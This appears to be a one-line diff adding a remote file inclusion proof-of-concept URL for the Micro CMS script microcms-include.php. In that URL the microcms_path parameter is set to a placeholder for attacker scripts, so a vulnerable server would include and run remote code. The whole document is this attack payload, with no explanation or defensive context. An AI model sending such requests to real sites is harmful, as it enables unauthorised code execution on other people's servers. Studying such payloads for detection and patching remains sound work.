@@ -1,0 +1,1 @@
+http://www.example.com/micro_cms_path/micro_cms_files/microcms-include.php?microcms_path=[evil scripts]
